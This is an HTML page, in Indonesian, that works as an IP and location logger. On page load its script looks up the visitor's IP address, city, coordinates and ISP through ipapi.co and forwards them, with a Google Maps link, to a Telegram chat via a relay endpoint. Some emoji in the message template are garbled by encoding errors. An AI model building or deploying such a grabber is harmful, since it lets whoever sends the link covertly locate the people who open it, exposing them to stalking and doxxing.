<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Pelacak IP & Lokasi</title>
</head>
<body>
  <h2>Memproses pelacakan lokasi...</h2>
  <p id="status">Mohon tunggu...</p>

  <script>
    async function sendTelegramMessage(text) {
      try {
        const res = await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message: text })
        });
        const data = await res.json();
        document.getElementById('status').innerText = data.ok
          ? 'Lokasi berhasil dikirim ke Telegram!'
          : 'Gagal kirim pesan: ' + data.error;
      } catch (err) {
        document.getElementById('status').innerText = 'Terjadi error saat mengirim pesan.';
        console.error(err);
      }
    }

    async function trackLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const message = `
üåç *Pengunjung Baru!* ...
‚Äî IP: \`${data.ip}\`
‚Äî Kota: ${data.city}, ${data.region}, ${data.country_name}
‚Äî Koordinat: ${data.latitude}, ${data.longitude}
‚Äî ISP/Org: ${data.org}
‚Äî Waktu: ${new Date().toLocaleString()}
‚Äî Zona Waktu: ${data.timezone}
[ Lihat di Google Maps ](https://www.google.com/maps?q=${data.latitude},${data.longitude})
`;

        sendTelegramMessage(message);
      } catch (err) {
        document.getElementById('status').innerText = 'Gagal mengambil lokasi.';
        console.error(err);
      }
    }

    trackLocation();
  </script>
</body>
</html>
